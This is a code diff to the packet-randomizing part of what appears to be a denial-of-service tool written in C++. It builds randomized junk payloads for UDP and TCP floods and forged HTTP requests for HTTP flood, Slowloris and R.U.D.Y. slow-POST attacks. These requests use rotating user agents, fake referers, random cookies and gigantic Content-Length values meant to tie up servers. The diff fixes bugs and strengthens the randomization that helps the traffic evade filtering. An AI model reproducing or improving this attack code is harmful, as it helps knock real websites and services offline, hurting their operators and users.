@@ -4,7 +4,6 @@
 #include <string>
 #include <random>
 #include <chrono>
-#include <algorithm>
 
 #include "Configuration.hpp"
 
@@ -17,7 +16,7 @@ namespace Randomizer{
         return distribution(engine);
     }
 
-    static const char *randomIP(){
+    static const std::string randomIP(){
         std::string src{std::to_string(randomInt(1, 256))};
         src += "."
                + std::to_string(randomInt(1, 256))
@@ -25,30 +24,27 @@ namespace Randomizer{
                + std::to_string(randomInt(1, 256))
                + "."
                + std::to_string(randomInt(1, 256));
-        return src.c_str();
+        return src;
     }
 
     static int randomPort(){
         return randomInt(0, 65535);
     }
 
-    static const char *randomstr(){
-        int string_length =  randomInt(0, 20) + 1;
+    static const std::string randomstr(){
+        int string_length =  randomInt(0, 20);
         std::string string{};
-        for(int i = 0; i < string_length; ++i){
+        for(int i = 0; i < string_length; i++){
             string += (static_cast<char>('0' + randomInt(0, 72)));
         }
-        return string.c_str();
+        return string;
     }
 
-    static const char *randomUserAgent(const config *conf){
-        if(conf->useragents.size() > 1){
-            return conf->useragents[randomInt(0, static_cast<int>(conf->useragents.size()))].c_str();
-        }
-        return conf->useragents[0].c_str();
+    static const std::string randomize_Vector(const std::vector<std::string> &vec){
+        return vec[randomInt(0, static_cast<int>(vec.size()) -1)];
     }
 
-    static const char *randomPacket(const config *conf, bool keep_alive=false){
+    static const std::string randomPacket(const config *conf, bool keep_alive=false){
         std::string packet{};
         std::vector<std::string> encoding{"\'\'", "*", "identity", "gzip", "deflate"};
         std::vector<std::string> caching{"no-cache", "max-age=0"};
@@ -58,38 +54,28 @@ namespace Randomizer{
         std::vector<std::string> referer{"https://www.google.com/", "https://www.yahoo.com/", "https://www.bing.com/",
                                          "https://twitter.com/", "https://www.facebook.com/", "https://www.msn.com/",
                                          "https://www.youtube.com/", "https://yandex.com/", "https://www.amazon.com/"};
-        shuffle(std::begin(encoding), std::end(encoding), std::mt19937(std::random_device()()));
-        shuffle(std::begin(caching), std::end(caching), std::mt19937(std::random_device()()));
-        shuffle(std::begin(charset), std::end(charset), std::mt19937(std::random_device()()));
-        shuffle(std::begin(contenttype), std::end(contenttype), std::mt19937(std::random_device()()));
-        shuffle(std::begin(methods), std::end(methods), std::mt19937(std::random_device()()));
-        shuffle(std::begin(referer), std::end(referer), std::mt19937(std::random_device()()));
         switch(conf->vector){
             case config::UDPFlood:
             case config::TCPFlood:
                 return randomstr();
             case config::HTTP:{
-                packet += methods[0] + " /";
+                packet += randomize_Vector(methods) + " /";
                 if(conf->RandomizeHeader){
                     packet += randomstr();
                 }
-                packet += " HTTP/1.0\r\nUser-Agent: ";
-                if(conf->RandomizeUserAgent){
-                    packet += randomUserAgent(conf);
-                }else{
-                    packet += conf->useragents[0];
-                }
-                packet += " \r\nCache-Control: " + caching[0]
-                          + " \r\nAccept-Encoding: " + encoding[0]
-                          + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
-                          + " \r\nReferer: " + referer[0]
+                packet += " HTTP/1.0\r\nUser-Agent: "
+                          + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
+                          +" \r\nCache-Control: " + randomize_Vector(caching)
+                          + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
+                          + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
+                          + " \r\nReferer: " + randomize_Vector(referer)
                           + " \r\nAccept: */*\r\nConnection: Keep-Alive"
-                          + " \r\nContent-Type: " + contenttype[0]
+                          + " \r\nContent-Type: " + randomize_Vector(contenttype)
                           + " \r\nCookie: " + randomstr() + "=" + randomstr()
                           + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
                           + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                           + "\r\n\r\n";
-                return packet.c_str();
+                return packet;
             }
             case config::Slowloris:{
                 if(keep_alive){
@@ -97,48 +83,40 @@ namespace Randomizer{
                               + std::to_string(randomInt(1, 5000))
                               + " \r\n";
                 }else{
-                    packet += methods[0] + " /";
+                    packet += randomize_Vector(methods) + " /";
                     if(conf->RandomizeHeader){
                         packet += randomstr();
                     }
-                    packet += " HTTP/1.0\r\nUser-Agent: ";
-                    if(conf->RandomizeUserAgent){
-                        packet += randomUserAgent(conf);
-                    }else{
-                        packet += conf->useragents[0];
-                    }
-                    packet += " \r\nCache-Control: " + caching[0]
-                              + " \r\nAccept-Encoding: " + encoding[0]
-                              + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
-                              + " \r\nReferer: " + referer[0]
-                              + " \r\nContent-Type: " + contenttype[0]
+                    packet += " HTTP/1.0\r\nUser-Agent: "
+                              + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
+                              + " \r\nCache-Control: " + randomize_Vector(caching)
+                              + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
+                              + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
+                              + " \r\nReferer: " + randomize_Vector(referer)
+                              + " \r\nContent-Type: " + randomize_Vector(contenttype)
                               + " \r\nCookie: " + randomstr() + "=" + randomstr()
                               + " \r\nAccept: */*"
                               + " \r\nDNT: " + std::to_string(randomInt(0, 1))
                               + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                               + " \r\n";
                 }
-                return packet.c_str();
+                return packet;
             }
             case config::Rudy:{
                 if(keep_alive){
-                    packet += Randomizer::randomstr();
+                    packet += randomstr();
                 }else{
-                    packet += methods[0] + "POST /";
+                    packet += "POST /";
                     if(conf->RandomizeHeader){
                         packet += randomstr();
                     }
-                    packet += " HTTP/1.0\r\nUser-Agent: ";
-                    if(conf->RandomizeUserAgent){
-                        packet += randomUserAgent(conf);
-                    }else{
-                        packet += conf->useragents[0];
-                    }
-                    packet += " \r\nCache-Control: " + caching[0]
-                              + " \r\nAccept-Encoding: " + encoding[0]
-                              + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
-                              + " \r\nReferer: " + referer[0]
-                              + " \r\nContent-Type: " + contenttype[0]
+                    packet += " HTTP/1.0\r\nUser-Agent: "
+                              + (conf->RandomizeUserAgent ? randomize_Vector(conf->useragents): conf->useragents[0])
+                              + " \r\nCache-Control: " + randomize_Vector(caching)
+                              + " \r\nAccept-Encoding: " + randomize_Vector(encoding)
+                              + " \r\nAccept-Charset: " + randomize_Vector(charset) + ", " + randomize_Vector(charset)
+                              + " \r\nReferer: " + randomize_Vector(referer)
+                              + " \r\nContent-Type: " + randomize_Vector(contenttype)
                               + " \r\nContent-Length: " + std::to_string(randomInt(100000000, 1000000000))
                               + " \r\nCookie: " + randomstr() + "=" + randomstr()
                               + " \r\nAccept: */*"
@@ -146,7 +124,7 @@ namespace Randomizer{
                               + " \r\nX-a: " + std::to_string(randomInt(1, 5000))
                               + " \r\n";
                 }
-                return packet.c_str();
+                return packet;
             }
             default:
                 return "";
